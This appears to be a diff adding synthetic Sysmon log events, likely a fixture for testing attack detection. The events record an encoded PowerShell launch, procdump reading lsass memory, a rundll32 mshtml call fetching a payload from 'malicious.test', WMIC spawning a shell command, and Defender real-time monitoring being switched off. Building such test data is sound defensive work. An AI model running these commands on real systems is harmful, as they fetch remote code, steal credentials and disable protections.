@@ -1,0 +1,5 @@
+{"timestamp": "2026-04-10T03:35:23Z", "EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -enc SQBFAFgA", "User": "CORP\\administrator", "log_type": "sysmon"}
+{"timestamp": "2026-04-10T03:36:23Z", "EventID": 10, "SourceImage": "C:\\Temp\\procdump.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1fffff", "log_type": "sysmon"}
+{"timestamp": "2026-04-10T03:40:23Z", "EventID": 1, "Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe javascript:\\..\\mshtml,RunHTMLApplication http://malicious.test/payload", "User": "CORP\\administrator", "log_type": "sysmon"}
+{"timestamp": "2026-04-10T03:41:23Z", "EventID": 1, "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic process call create \"cmd.exe /c whoami\"", "User": "CORP\\administrator", "log_type": "sysmon"}
+{"timestamp": "2026-04-10T03:42:23Z", "EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true", "User": "CORP\\administrator", "log_type": "sysmon"}
